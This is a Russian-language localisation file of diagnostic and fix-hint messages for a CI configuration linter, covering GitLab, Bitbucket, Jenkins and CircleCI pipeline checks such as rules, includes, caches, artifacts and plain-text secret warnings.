unknown-section-looks-like = Неизвестный раздел { $a0 } — похоже на { $a1 }
job-must-be-set-of = { $a0 }: задание должно быть набором ключей
anything-that-isnt-reserved-section = Всё, что не является служебным разделом ({ $a0 } и др.), GitLab считает заданием, а задание не может быть { $a1 }.
list = списком
string = строкой
at-top-level-all-keys = На верхнем уровне все ключи, кроме служебных (stages, variables, default…), — это задания; задание описывается картой с script/stage и т.д.
write-it-as-job-script =
    Оформите как задание:
    { $a0 }:
    {"  "}script:
    {"    "}- { $a1 }
configuration-has-no-jobs = В конфигурации нет ни одного задания
file-has-only-reserved-sections = В файле только служебные разделы.
there-are-only-hidden-jobs = Есть только скрытые задания (имя начинается с точки) — они служат шаблонами и сами не запускаются.
add-job-whose-name-doesnt =
    Добавьте задание без точки в начале имени, например:
    build:
    {"  "}script:
    {"    "}- echo "ok"
stages-must-be-list = stages должен быть списком
stages-are-listed-in-order = Этапы перечисляются списком в порядке выполнения.
types-section-is-deprecated = Раздел types устарел
in-newer-gitlab-versions-17 = В новых версиях GitLab (17.0+) ключ удалён — файл перестанет проходить проверку.
types-is-old-name-of = types — старое название stages.
rename-types-to-stages = Переименуйте types в stages.
variables-must-be-set-of = variables должен быть набором «ИМЯ: значение»
variables-are-given-as-map = Переменные задаются картой, а не списком.
global-is-deprecated-use-default = Глобальный { $a0 } устарел — используйте default:
it-works-for-now-but-gitlab = Сейчас работает, но GitLab пометил такую запись устаревшей и может убрать её.
top-level-job-keys-were = Ключи заданий на верхнем уровне ({ $a0 }) заменены разделом default.
is-set-in-each-job = {" "}{ $a0 } задаётся в каждом задании (variables — на верхнем уровне).
default-unknown-key = default: неизвестный ключ { $a0 }
only-these-are-allowed-in = В default допустимы только: { $a0 }.{ $a1 }{ $a2 }
remove-key-from-default-or = Уберите ключ из default или перенесите в задания.
include-path-with-variable = include { $a0 }: путь с переменной
file-cant-be-checked-in = Проверить файл заранее нельзя: он определяется переменной в момент создания пайплайна.
only-some-variables-are-allowed = В include разрешены только некоторые переменные (проекта, группы, предопределённые).
make-sure-file-exists-for = Убедитесь, что при всех значениях переменной файл существует.
include-not-yaml-file = include { $a0 }: не YAML-файл
only-yml-yaml-files-can = Подключать можно только файлы .yml / .yaml.
rename-file-to-yml-or = Переименуйте файл в .yml или укажите правильный.
not-found = не найден
no-file-matches-pattern = ; под шаблон не подходит ни один файл
include-file-isnt-in-repository = include { $a0 }: файла нет в репозитории
file-is-looked-up-from = Файл ищется от корня репозитория в той же ветке/коммите{ $a0 }.
check-path-from-root-letter = Проверьте путь (от корня, регистр букв) и что файл закоммичен.
gitlab-limits-nesting-of-includes = GitLab ограничивает вложенность подключений.
shorten-include-chain = Сократите цепочку include.
include-over-insecure-http = include { $a0 }: по незащищённому http
file-can-be-tampered-with = Файл может быть подменён по дороге — и подменённые задания выполнятся с вашими переменными и токенами.
remote-files-are-downloaded-every = remote-файлы скачиваются при каждом создании пайплайна.
use-https-or-keep-file = Используйте https:// или храните файл в репозитории (include: local / project).
include-unrecognized-entry = include: непонятная запись
include-must-contain-one-of = Подключение должно содержать один из ключей: local, project (+ file), remote, template, component.
include-project-without-file = include project без file
including-from-another-project-requires = Для подключения из другого проекта нужно указать file.
network-includes-not-checked = Не проверены подключения из сети: { $a0 }
if-such-file-is-unavailable = Если такой файл недоступен или в нём ошибка, GitLab не создаст пайплайн.
these-files-are-outside-repository = { $a0 }{ $a1 } — эти файлы лежат вне репозитория, без сети их не проверить; задания из них в проверке не учтены.
check-merged-configuration-in-gitlab = Проверьте итоговую конфигурацию в GitLab: CI/CD → Editor → Full configuration (или Validate).
is-defined-in-several-files = { $a0 } описано в нескольких файлах
final-job-is-merge-of = Итоговое задание — слияние описаний: ключи из { $a0 } перекрывают ключи из { $a1 }; списки (script, rules) заменяются целиком.
main-file = основного файла
thats-how-include-works-jobs = Так работает include: одноимённые задания объединяются.
if-this-is-intended-all = Если это сделано намеренно — всё в порядке; иначе переименуйте одно из заданий.
workflow-must-be-map = workflow должен быть картой
workflow-contains-rules-name-auto = workflow содержит rules / name / auto_cancel.
workflow-unknown-key = workflow: неизвестный ключ { $a0 }
remove-or-rename-key = Уберите или переименуйте ключ.

## crates/gorynych-ci-linter/src/check/gitlab/rules.rs

variable-will-be-empty = Переменная будет пустой: { $a0 }.
command-will-get-empty-string = команда получит пустую строку
condition-will-never-work-as = условие никогда не сработает так, как задумано
no-longer-exists = ${ $a0 } больше не существует
ci-build-variables-were-removed = Переменные CI_BUILD_* удалены в GitLab 9.0; теперь это ${ $a0 }.
replace-with = Замените на ${ $a0 }.
theres-no-such-predefined-variable = ${ $a0 } — нет такой предопределённой переменной
there-will-be-no-error-but = Ошибки не будет, но на месте переменной окажется пустая строка.
there-will-be-no-error-but-variable = Ошибки не будет, но переменная всегда пустая — условие будет вести себя так, будто её нет.
looks-like-typo-theres = Похоже на опечатку: есть ${ $a0 }.
names-with-ci-gitlab-are = Имена с CI_ / GITLAB_ зарезервированы GitLab, а такой среди них нет (если это переменная из настроек проекта — всё в порядке).
check-name = Проверьте имя.
rules-must-be-list = { $a0 }: rules должен быть списком
each-rule-is-separate-list = Каждое правило — отдельный элемент списка, начинается с «- ».
string-2 = строка { $a0 }
rule-isnt-map = { $a0 }: правило { $a1 } — не карта
rule-is-currently = Сейчас правило — { $a0 }.
works-only-in-job-rules = {" "}{ $a0 } работает только в rules заданий.
rule-has-unknown-key = { $a0 }: в правиле { $a1 } неизвестный ключ { $a2 }
fix-or-remove-key = Исправьте или уберите ключ.
only-always-and-never-are = В workflow:rules допустимы только always и never.
rule-when = { $a0 }: правило { $a1 }: when: { $a2 }
rule-delayed-without-start-in = { $a0 }: правило { $a1 }: delayed без start_in
delay-must-be-specified = Нужно указать задержку.
error-in-condition = { $a0 }: ошибка в условии { $a1 }
example-if-ci-commit-branch = Пример: if: '$CI_COMMIT_BRANCH == "main" && $CI_PIPELINE_SOURCE == "push"'
rule-if-must-be-string = { $a0 }: правило { $a1 }: if должен быть строкой
yaml-read-value-as = YAML прочитал значение как { $a0 }.
quote-expression-if-var-x = Возьмите выражение в кавычки: if: '$VAR == "x"'
rule-exists-no-such-files = { $a0 }: правило { $a1 }: exists — таких файлов нет
rule-will-never-fire-until = Правило никогда не сработает, пока такие файлы не появятся в репозитории.
no-repository-file-matches = Под { $a0 } не подходит ни один файл репозитория.
check-path-pattern-from-repository = Проверьте путь/шаблон (от корня репозитория, регистр букв).
rule-changes-unknown-key = { $a0 }: правило { $a1 }: changes — неизвестный ключ { $a2 }
allowed-paths-and-compare-to = Допустимы paths и compare_to.
rule-changes-no-such-files = { $a0 }: правило { $a1 }: changes — сейчас таких файлов нет
on-push-and-in-merge = При push и в merge request
rule-wont-fire-on-regular = Правило не сработает при обычных изменениях (только если такие файлы добавят).
no-file-currently-matches = Под { $a0 } сейчас не подходит ни один файл.
check-pattern-src-all-files = Проверьте шаблон: «src/**/*» — все файлы в src, «*.md» — только в корне.
rule-is-never-checked = { $a0 }: правило { $a1 } никогда не проверяется
there-will-be-no-error-but-this = Ошибки не будет, но это правило ни на что не влияет.
rule-has-no-conditions-and = Правило { $a0 } без условий срабатывает всегда, а GitLab берёт первое подходящее правило.
move-rule-without-conditions-to = Переставьте правило без условий в конец списка.
all-rules-are-when-never = { $a0 }: все правила — when: never
job-wont-be-in-any-pipeline = Задание не попадёт ни в один пайплайн.
if-no-rule-includes-job = Если ни одно правило не включает задание, оно исключается; здесь все правила только исключают.
add-rule-when-on-success = Добавьте в конец правило «- when: on_success» (или нужное условие).
workflow-rules-all-rules-are = workflow:rules: все правила — when: never
pipeline-will-never-be-created = Пайплайн не будет создаваться никогда.
if-no-workflow-rule-fires = Если ни одно правило workflow не сработало с when: always, пайплайн не создаётся.
add-when-always-at-end = Добавьте в конец «- when: always» или правило с нужным условием.
condition = Условие { $a0 }.
will-never-be-true = никогда не выполнится
will-always-be-true = выполнится всегда
possible-values = Возможные значения: { $a0 }…{ $a1 }
check-value = Проверьте значение.
replace-with-2 = Замените на "{ $a0 }".
ci-pipeline-source-is-never = { $a0 }: CI_PIPELINE_SOURCE никогда не равен { $a1 }
branch-isnt-in-repository = { $a0 }: ветки { $a1 } нет в репозитории
condition-with-will-never-fire = Условие с { $a0 } никогда не сработает — основная ветка здесь { $a1 }.
condition-will-fire-only-when = Условие сработает, только когда появится ветка { $a0 }.
is-compared-with-and-repository = Сравнивается ${ $a0 } с { $a1 }, а в репозитории { $a2 }.
main-branch-is = основная ветка — { $a0 }
no-such-branch-neither-local = такой ветки нет (ни локально, ни на удалённом сервере)
use-ci-default-branch-instead = Используйте $CI_DEFAULT_BRANCH вместо "{ $a0 }" — так условие не зависит от названия ветки.
if-its-typo-fix-it = Если это опечатка — исправьте; для основной ветки лучше $CI_DEFAULT_BRANCH.
fix-key-or-better-switch = Исправьте ключ (а лучше перейдите на rules).
error-in-variables = { $a0 }: ошибка в { $a1 }:variables { $a2 }
example-ci-commit-message-deploy = Пример: - $CI_COMMIT_MESSAGE =~ /deploy/
is-branch-name-not = { $a0 }: { $a1 }: { $a2 } — это имя ветки, а не { $a3 }
gitlab-will-read-as-branch = GitLab поймёт { $a0 } как название ветки или тега и { $a1 }.
will-run-job-only-for = будет запускать задание только для неё
will-exclude-only-it = исключит только её
keyword-is-written = Ключевое слово пишется { $a0 }.
replace-with-3 = Замените на { $a0 }.

## crates/gorynych-ci-linter/src/check/gitlab/simulate.rs

changed-files-changes = изменённые файлы (changes)
no-workflow-rules-rule-matched = ни одно правило workflow:rules не подошло
workflow-rules-rule-when-never = workflow:rules, правило { $a0 }: when: never
no-rules-rule-matched = ни одно правило rules не подошло
rule-when-never = правило { $a0 }: when: never
rule = правило { $a0 }
doesnt-match-only = не подходит под only
without-rules-job-runs-by = без rules задание по умолчанию только для веток и тегов (only: branches, tags)
excluded-by-except = исключено except
matches-only = подходит под only
no-conditions = без условий
no-job-matched-conditions = ни одно задание не подошло под условия
there-are-only-pre-post = есть только задания этапов .pre/.post
workflow-rules-rule = workflow:rules, правило { $a0 }
there-are-matching-jobs = есть подходящие задания
pipeline-wont-be-created = { $a0 }: пайплайн не создастся
on-run-pipeline-gitlab-will = При нажатии «Run pipeline» GitLab ответит: «Pipeline will not run for the selected trigger. The rules configuration prevented any jobs from being added to the pipeline.»
pipeline-just-wont-appear = Пайплайн просто не появится.
if-manual-run-is-needed = Если ручной запуск нужен — добавьте правило: - if: $CI_PIPELINE_SOURCE == "web"
check-job-rules = Проверьте rules заданий.
jobs-without-rules-get-into = {" "}(задания без rules попадают в пайплайн MR, только если его разрешает workflow:rules)
is-in-pipeline-and-isnt = { $a0 } попадает в пайплайн ({ $a1 }), а { $a2 } — нет ({ $a3 }).
excluded = исключено
waits-for-which-wont-exist = { $a0 }: { $a1 } ждёт { $a2 }, которого не будет
gitlab-wont-create-pipeline = GitLab не создаст пайплайн: «{ $a0 }»
make-conditions-of-and-same =
    Сделайте условия { $a0 } и { $a1 } одинаковыми или добавьте optional: true:
    needs:
    {"  "}- job: { $a2 }
    {"    "}optional: true
takes-artifacts-from-which-wont = { $a0 }: { $a1 } берёт артефакты у { $a2 }, которого не будет
gitlab-wont-create-pipeline-job = GitLab не создаст пайплайн: «{ $a0 } job: undefined dependency: { $a1 }»
is-excluded-in-this-pipeline = { $a0 } исключено в этом пайплайне ({ $a1 }).
align-job-conditions-or-remove = Согласуйте условия заданий или уберите зависимость.
stop-job-isnt-in-pipeline = { $a0 }: задание остановки { $a1 } не попадает в пайплайн
gitlab-wont-create-pipeline-job-on = GitLab не создаст пайплайн: «{ $a0 } job: on_stop job { $a1 } is not defined»
is-in-pipeline-and-isnt-2 = { $a0 } есть в пайплайне, а { $a1 } — нет.
give-same-rules-as-with = Дайте { $a0 } те же rules, что у { $a1 } (с when: manual).
creates-release-without-tag = { $a0 }: { $a1 } создаёт релиз без тега
job-will-fail-ci-commit = Задание упадёт: $CI_COMMIT_TAG пустой — «tag_name is missing» / «release tag name can't be blank».
job-with-release-tag-name = Задание с release: tag_name: $CI_COMMIT_TAG попадает в пайплайн без тега.
jobs-wont-start-until-then = ; задания { $a0 } не стартуют до этого
is-manual-and-blocking = { $a0 } — ручное и блокирующее
pipeline-will-stop-in-blocked = Пайплайн остановится в статусе «blocked» и будет ждать нажатия ▶{ $a0 }.
for-when-manual-inside-rules = У when: manual внутри rules allow_failure по умолчанию false (в отличие от when: manual у самого задания).
allow-failure-false-on-manual = allow_failure: false у ручного задания.
if-no-waiting-is-needed = Если ждать не нужно — добавьте allow_failure: true рядом с when: manual.
push-to = Push в { $a0 }
tag-v1-0-0 = Тег v1.0.0
schedule = Расписание ({ $a0 })
manual-run = Запуск вручную ({ $a0 })
push-to-with-open-mr = Push в { $a0 } с открытым MR
duplicate-pipelines-for-branch-and = Двойные пайплайны: для ветки и для merge request
on-every-push-to-branch = При каждом push в ветку с открытым merge request
two-pipelines-will-run-for = Запустятся два пайплайна на один коммит: «branch» ({ $a0 } задан.) и «merge request» ({ $a1 } задан.) — раннеры заняты вдвое, статус MR может зависеть от любого из них.
rules-allow-both-push-pipelines = Правила допускают и push-пайплайны для любой ветки, и пайплайны merge request, а условие «если MR уже открыт — не создавать пайплайн ветки» не задано.
nothing-runs-when-merge-request = При открытом merge request не запускается ничего
on-push-to-branch-with = При push в ветку, по которой открыт merge request
branch-pipeline-isnt-created-and = Пайплайн ветки не создаётся ({ $a0 }), а пайплайн merge request пустой ({ $a1 }) — изменения уходят без проверок.
rules-forbid-branch-pipeline-when = Правила запрещают пайплайн ветки при открытом MR, но задания не настроены для пайплайнов MR.
add-rule-if-ci-pipeline = Добавьте заданиям правило - if: $CI_PIPELINE_SOURCE == "merge_request_event" или разрешите MR в workflow:rules.
no-pipeline-is-created-on = Пайплайн не создаётся ни при push, ни для MR, ни для тега
on-push-merge-request-and = При push, merge request и теге
nothing-will-run-gitlab-will = Ничего не будет запускаться — GitLab молча не создаст пайплайн.
check-workflow-rules-and-job = Проверьте workflow:rules и rules заданий.
rules-only-conditions-arent-met = Условия rules/only не выполняются.
isnt-in-any-typical-pipeline = { $a0 } не попадает ни в один типичный пайплайн
job-wont-run-on-push = Задание не запустится при push, MR, теге, по расписанию и при ручном запуске.
if-job-runs-via-api = Если задание запускается через API/триггер или по особой переменной — всё в порядке; иначе проверьте условия.

## crates/gorynych-ci-linter/src/check/gitlab/values.rs

variables-must-be-set-of-name = { $a0 }: variables должен быть набором «ИМЯ: значение»
its-currently-list-with = Сейчас это список (через «- »).
its-currently-not-map = Сейчас это не карта.
variable-name-isnt-usable-in = Имя переменной { $a0 } недоступно в shell
when-jobs-run-2 = При выполнении заданий
wont-expand-in-script-shell = В скрипте ${ $a0 } не раскроется ({ $a1 } в имени не допускается shell).
hyphen = дефис
character = символ
environment-variable-names-are-latin = Имена переменных окружения — латинские буквы, цифры и «_», не с цифры.
rename-it-for-example-to = Переименуйте, например { $a0 }.
unquoted-boolean = { $a0 }: { $a1 } — логическое значение без кавычек
variable-values-are-strings-yaml = Значения переменных — строки; YAML прочитал true/false/yes/no как логическое значение.
value-is-list = { $a0 }: значение — список
variable-cant-be-list = Переменная не может быть списком.
allowed-value-description-options-expand = Допустимы value, description, options, expand.
value-isnt-in-options = { $a0 }: значение { $a1 } не входит в options
add-value-to-options-or = Добавьте значение в options или исправьте value.
options-in-job-variable = { $a0 }: options в переменной задания
options-only-work-for-global = options работают только у глобальных переменных (форма ручного запуска).
they-do-nothing-here = Здесь они ничего не дадут.
move-variable-to-global-variables = Перенесите переменную в глобальный variables.
in-plain-text-in-file = { $a0 }: в файле открытым текстом { $a1 }
anyone-with-access-to-repository = Любой, у кого есть доступ к репозиторию (или к его копии), получит этот ключ; в логах заданий значение тоже не скрывается.
variables-from-gitlab-ci-yml = Переменные из .gitlab-ci.yml не маскируются и не защищены.
revoke-key-create-new-one = Отзовите ключ, создайте новый и сохраните его в Settings → CI/CD → Variables (Masked, Protected); в файле оставьте только имя.
looks-like-plain-text-secret = { $a0 }: похоже на секрет в открытом виде
value-is-visible-to-anyone = Значение видно всем, у кого есть доступ к репозиторию, и не маскируется в логах.
name-looks-like-password-token = Имя { $a0 } похоже на пароль/токен, а значение задано прямо в файле.
move-value-to-settings-ci = Перенесите значение в Settings → CI/CD → Variables (Masked) и удалите из файла.
when-each-job-with-this = При запуске каждого задания с этим образом
empty = { $a0 }: пустой { $a1 }
image-name-isnt-set = Имя образа не задано.
space-in-image-name = { $a0 }: пробел в имени образа { $a1 }
job-will-fail-invalid-reference = Задание упадёт: «invalid reference format».
image-name-cant-contain-spaces = В имени образа не может быть пробелов.
depends-on = { $a0 }: { $a1 } { $a2 } зависит от ${ $a3 }
if-isnt-set-in-project = Если ${ $a0 } не задана в настройках проекта, задание упадёт: «invalid reference format» или «pull access denied».
variable-isnt-declared-in-file = Переменная не объявлена в файле.
declare-default-value-in-variables = Объявите значение по умолчанию в variables: { $a0 }: …
uppercase-letters-in-image-name = { $a0 }: заглавные буквы в имени образа { $a1 }
job-will-fail-invalid-reference-format = Задание упадёт: «invalid reference format: repository name must be lowercase».
docker-image-names-are-lowercase = Имена образов Docker — только строчные.
without-version-2 = { $a0 }: { $a1 } { $a2 } без версии
it-works-today-but-job = Сегодня работает, а после выхода новой версии образа задание может внезапно сломаться.
without-tag-latest-is-used = Без тега берётся :latest — он меняется со временем.
specify-version-version = Укажите версию: { $a0 }:<версия>
image = образ
image-unknown-key = { $a0 }: image — неизвестный ключ { $a1 }
allowed-name-entrypoint-docker-pull = Допустимы name, entrypoint, docker, pull_policy, kubernetes.
image-has-no-name = { $a0 }: у image нет name
image-must-be-specified = Нужно указать образ.
image-must-be-string = { $a0 }: image должен быть строкой
artifacts-must-be-map = { $a0 }: artifacts должен быть картой
artifacts-contains-paths-expire-in = artifacts содержит paths, expire_in и т.д.
artifacts-unknown-key = { $a0 }: artifacts — неизвестный ключ { $a1 }
artifacts-paths-must-be-list = { $a0 }: artifacts:paths должен быть списком
even-single-path-is-written = Даже один путь пишется списком.
artifact-path-is-outside-project = { $a0 }: путь артефакта { $a1 } вне папки проекта
at-end-of-job = В конце задания { $a0 }
files-wont-be-saved-warning = Файлы не сохранятся: «WARNING: { $a0 }: not supported: outside build directory» и «ERROR: No files to upload».
artifacts-can-only-be-taken-inside = Артефакты можно брать только внутри $CI_PROJECT_DIR.
copy-files-into-project-folder = Копируйте файлы в папку проекта и указывайте относительный путь.
artifacts-doesnt-say-what-to = { $a0 }: в artifacts не указано, что сохранять
runner-wont-upload-anything-warning = Раннер ничего не загрузит: «WARNING: No files to upload».
there-are-no-paths-reports = Нет ни paths, ни reports, ни untracked.
cant-parse-expire-in = { $a0 }: не разобрать expire_in: { $a1 }
written-as-1-week-30 = Пишется как «1 week», «30 days» или «never».
report-is-no-longer-supported = { $a0 }: отчёт { $a1 } больше не поддерживается
report-type-was-removed-from = Тип отчёта удалён из GitLab.
use = Используйте { $a0 }.
unknown-report-type = { $a0 }: неизвестный тип отчёта { $a1 }
unknown-type = Неизвестный тип.{ $a0 }
check-report-name = Проверьте название отчёта.
coverage-report-without-coverage-format = { $a0 }: coverage_report без coverage_format/path
both-keys-are-required = Нужны оба ключа.
cobertura-and-jacoco-are-supported = Поддерживаются cobertura и jacoco.
more-than-4-caches = { $a0 }: больше 4 кэшей
merge-caches = Объедините кэши.
cache-must-be-map = { $a0 }: cache должен быть картой
cache-contains-key-paths-policy = cache содержит key, paths, policy.
cache-unknown-key = { $a0 }: cache — неизвестный ключ { $a1 }
cache-key-contains-or-is = { $a0 }: в cache:key есть «/» или это «.»
cache-key-becomes-part-of = Ключ кэша становится частью имени файла.
use-ci-commit-ref-slug = Используйте $CI_COMMIT_REF_SLUG вместо $CI_COMMIT_REF_NAME (в нём нет «/»).
cache-key-with-branch-name = { $a0 }: cache:key с именем ветки
in-branches-with-in-name = В ветках со «/» в имени (feature/x)
cache-wont-be-saved-branch = Кэш не сохранится: имя ветки со слэшем недопустимо в ключе.
ci-commit-ref-name-may = $CI_COMMIT_REF_NAME может содержать «/».
use-ci-commit-ref-slug-2 = Используйте $CI_COMMIT_REF_SLUG.
more-than-two-cache-key = { $a0 }: cache:key:files больше двух
key-can-be-built-from = Ключ можно строить максимум по двум файлам.
keep-1-2-files-usually = Оставьте 1–2 файла (обычно lock-файл).
cache-key-files-no-file = { $a0 }: cache:key:files — нет файла { $a1 }
cache-will-be-shared-under = Кэш будет общим с ключом «default» для всех веток и не будет сбрасываться при изменении зависимостей.
file-isnt-in-repository-2 = Файла { $a0 } нет в репозитории.
specify-existing-lock-file = Укажите существующий lock-файл.
cache-key-unknown-key = { $a0 }: cache:key — неизвестный ключ { $a1 }
allowed-files-and-prefix = Допустимы files и prefix.
unknown-value-2 = Неизвестное значение.
cache-paths-must-be-list = { $a0 }: cache:paths должен быть списком
cache-doesnt-say-what-to = { $a0 }: в cache не указано, что кэшировать
cache-wont-be-created-runner = Кэш не будет создан: раннер пропустит шаг сохранения кэша.
there-are-no-paths-or = Нет ни paths, ни untracked.
cache-path-is-outside-project = { $a0 }: путь кэша { $a1 } вне папки проекта
warning-not-supported-outside-build = «WARNING: { $a0 }: not supported: outside build directory» — путь не попадёт в кэш.
only-paths-inside-project-folder = Кэшировать можно только внутри папки проекта.
move-cache-inside-project-for = Перенесите кэш внутрь проекта (например, npm_config_cache: .npm).
environment-must-be-string-or = { $a0 }: environment должен быть строкой или картой
set-environment-name = Задайте имя окружения.
environment-unknown-key = { $a0 }: environment — неизвестный ключ { $a1 }
environment-has-no-name = { $a0 }: у окружения нет name
environment-is-identified-by-its = Окружение определяется именем.
invalid-environment-name = { $a0 }: недопустимое имя окружения { $a1 }
name-contains-forbidden-characters = В имени есть запрещённые символы.
for-example-review-ci-commit = Например: review/$CI_COMMIT_REF_SLUG
environment-url-isnt-address = { $a0 }: environment:url { $a1 } — не адрес
url-must-start-with-http = URL должен начинаться с http:// или https://.
cant-parse-auto-stop-in = { $a0 }: не разобрать auto_stop_in: { $a1 }
written-as-1-week-2 = Пишется как «1 week», «2 days».
on-stop-refers-to-nonexistent = { $a0 }: on_stop ссылается на несуществующее { $a1 }
add-environment-stop-job-or = Добавьте задание остановки окружения или поправьте имя.
no-environment-action-stop = { $a0 }: нет environment:action: stop
is-listed-in-on-stop = { $a0 } указан в on_stop у { $a1 }, значит должен останавливать окружение.
different-environment-name = { $a0 }: другое имя окружения
environment-is-and-has = Окружение { $a0 } — { $a1 }, а у { $a2 } — { $a3 }.
use-one-name = Используйте одно имя: { $a0 }.
will-run-automatically = { $a0 } запустится автоматически
in-every-pipeline-with-this = В каждом пайплайне с этим заданием
environment-will-be-stopped-right = Окружение будет остановлено сразу после развёртывания.
stop-job-without-when-manual = Задание остановки без when: manual выполняется как обычное.

## crates/gorynych-ci-linter/src/check/mod.rs

yaml-syntax-error = Ошибка синтаксиса YAML: { $a0 }
right-on-push-file-cant = Сразу при push — файл не читается
ci-server-wont-be-able = Сервер CI не сможет прочитать файл и не запустит ни одного задания.
file-will-be-read-but = Файл прочитается, но, возможно, не так, как задумано.
yaml-structure-is-broken-indentation = Нарушена структура YAML: отступы, двоеточия, кавычки или табуляция вместо пробелов.
ambiguous-yaml-entry = Неоднозначная запись в YAML.
check-indentation-spaces-only-same = Проверьте отступы (только пробелы, одинаковое число на уровне) и кавычки вокруг строк с «: » или «#».
check-was-interrupted = Проверка прервалась
some-checks-werent-run = Часть проверок не выполнена.
report-bug-configuration-check-shouldnt = Сообщите об ошибке — проверка конфигурации не должна падать.
pipeline-diagram-may-be-incomplete = Схема пайплайна может быть показана неполно.
check-file = Проверьте файл.

## crates/gorynych-ci-linter/src/check/other.rs

bitbucket-wont-run-pipeline = Bitbucket не запустит пайплайн: «Configuration error: { $a0 }».
parallel-with-one-step = { $a0 }: parallel с одним шагом
there-will-be-no-error-but-no = Ошибки не будет, но параллельности тоже.
parallel-needs-at-least-two = В parallel нужно минимум два шага.
remove-parallel-or-add-steps = Уберите parallel или добавьте шаги.
item-without-step = { $a0 }: элемент без step
pipeline-item-is-step-parallel = Элемент пайплайна — step, parallel или stage.
no-script-2 = { $a0 }: { $a1 } — нет script
step-has-nothing-to-run = Шагу нечего выполнять.
empty-script-2 = { $a0 }: { $a1 } — пустой script
at-least-one-command-is = Нужна хотя бы одна команда.
add-command = Добавьте команду.
from-1-to-120-minutes = Допустимо от 1 до 120 минут.
allowed-4 = Допустимы: { $a0 }.
allowed-manual-and-automatic = Допустимы manual и automatic.
built-in-caches-custom-ones = Встроенные кэши: { $a0 }; свои нужно описать в definitions.caches.{ $a1 }
unknown-cache = { $a0 }: { $a1 } — неизвестный кэш { $a2 }
definitions-caches-path-to-folder =
    definitions:
    {"  "}caches:
    {"    "}{ $a0 }: путь/к/папке
service-isnt-defined = { $a0 }: { $a1 } — сервис { $a2 } не описан
services-except-docker-are-defined = Сервисы (кроме docker) описываются в definitions.services.
environment-is-used-twice = { $a0 }: окружение { $a1 } используется дважды
in-one-pipeline-each-environment = В одном пайплайне каждое окружение развёртывается одним шагом.
use-different-environments-or-merge = Используйте разные окружения или объедините шаги.
docker-without-services-docker = { $a0 }: { $a1 } — docker без services: [docker]
when-step-runs = При выполнении шага { $a0 }
step-will-fail-cannot-connect = Шаг упадёт: «Cannot connect to the Docker daemon at unix:///var/run/docker.sock» (или «docker: command not found»).
docker-in-bitbucket-pipelines-is = Docker в Bitbucket Pipelines доступен только как сервис.
step-3 = шага
right-on-push-bitbucket-checks = Сразу при push — Bitbucket проверяет bitbucket-pipelines.yml до запуска
no-pipelines-section = Нет раздела pipelines
without-pipelines-bitbucket-doesnt-know = Без pipelines Bitbucket не знает, что запускать.
options-max-time-more-than = options: max-time { $a0 } — больше 120 минут
step-in-bitbucket-cloud-is = Шаг в Bitbucket Cloud ограничен 120 минутами.
pipelines-unknown-section = pipelines: неизвестный раздел { $a0 }
allowed-default-branches-tags-bookmarks = Допустимы default, branches, tags, bookmarks, pull-requests, custom.{ $a0 }
fix-section-name = Исправьте имя раздела.
must-be-list-of-steps = { $a0 }: должен быть список шагов
pipeline-is-list-of-step = Пайплайн — список «- step: …».
first-step-cant-be-manual = { $a0 }: первый шаг не может быть ручным
pipeline-starts-automatically-and-so = Пайплайн стартует автоматически, первый шаг тоже.
remove-trigger-manual-from-first = Уберите trigger: manual у первого шага (или сделайте пайплайн custom).
build-will-fail-right-away = Сборка сразу упадёт с ошибкой разбора: «org.codehaus.groovy.control.MultipleCompilationErrorsException: startup failed: WorkflowScript: { $a0 }».
when-build-starts-jenkins-parses = При запуске сборки — Jenkins сначала разбирает Jenkinsfile
expected-closing-one-for-from = Ожидалась закрывающая для «{ $a0 }» из строки { $a1 }.
it-has-no-opening-bracket = Для неё нет открывающей скобки.
extra-on-line = Лишняя «{ $a0 }» в строке { $a1 }
check-that-brackets-are-paired = Проверьте парность скобок.
unclosed-string = Не закрыта строка { $a0 }
quote-somewhere-has-no-pair = Где-то открыта кавычка без пары.
check-quotes = Проверьте кавычки.
unclosed-from-line = Не закрыта «{ $a0 }» из строки { $a1 }
file-ended-before-all-blocks = Файл кончился раньше, чем закрылись все блоки.
add-missing-bracket = Добавьте недостающую скобку.
pipeline-has-no-agent = В pipeline нет agent
declarative-pipeline-must-say-where = Декларативный pipeline должен указать, где выполняться.
pipeline-has-no-stages = В pipeline нет stages
stages-are-required = Этапы обязательны.
stage-declared-twice-2 = Этап { $a0 } объявлен дважды
first-time-on-line = Первый раз — в строке { $a0 }.
rename-one-of-stages = Переименуйте один из этапов.
stage-without-steps = Этап { $a0 } без steps
stage-has-nothing-to-run = Этапу нечего выполнять.
stage-at-once = Этап { $a0 }: одновременно { $a1 }
and = {" "}и{" "}
only-one-is-allowed = Можно что-то одно.
split-them-into-nested-stages = Разнесите на вложенные этапы.
post-unknown-condition = post: неизвестное условие { $a0 }
unknown-condition = Неизвестное условие.{ $a0 }
fix-condition = Исправьте условие.
neither-pipeline-nor-node-found = Не найдено ни pipeline {"{"} {"}"}, ни node {"{"} {"}"}
jenkins-will-run-file-as = Jenkins выполнит файл как Groovy-скрипт — скорее всего, ничего не соберётся.
jenkinsfile-starts-with-pipeline = Jenkinsfile начинается с pipeline {"{"} … {"}"} (декларативный) или node {"{"} … {"}"} (скриптовый).
in-plain-text-in-jenkinsfile = В Jenkinsfile открытым текстом { $a0 }
secrets-must-be-stored-in-jenkins = Секреты нужно хранить в Jenkins Credentials.
revoke-key-use-withcredentials-string = Отзовите ключ; используйте withCredentials([string(credentialsId: '…', variable: 'TOKEN')]) {"{"} … {"}"}
build = сборки
right-on-push-circleci-checks = Сразу при push — CircleCI проверяет config.yml до запуска
version-isnt-specified = Не указан version
circleci-wont-run-build-config = CircleCI не запустит сборку: «Config does not conform to schema: missing required property version».
first-line-of-configuration-is = Первая строка конфигурации — версия.
job-isnt-defined = { $a0 }: задание { $a1 } не описано
circleci-wont-run-workflow-job = CircleCI не запустит workflow: «Job '{ $a0 }' not found».
jobs-has-no = В jobs нет { $a0 }.{ $a1 }
fix-name-or-define-job = Исправьте имя или опишите задание.
orb-isnt-included = { $a0 }: orb { $a1 } не подключён
circleci-wont-run-workflow-cannot = CircleCI не запустит workflow: «Cannot find a definition for job named { $a0 }».
orb-must-be-declared-in = Орб нужно объявить в разделе orbs.
waits-for-which-isnt-in = { $a0 }: { $a1 } ждёт { $a2 }, которого нет в workflow
circleci-wont-run-workflow-job-requires = CircleCI не запустит workflow: «Job '{ $a0 }' requires '{ $a1 }', which is the name of 0 other jobs in workflow '{ $a2 }'».
workflow-has-no-job = В workflow { $a0 } нет задания { $a1 }.{ $a2 }
fix-name-2 = Исправьте имя.
no-executor-specified = { $a0 }: не указан исполнитель
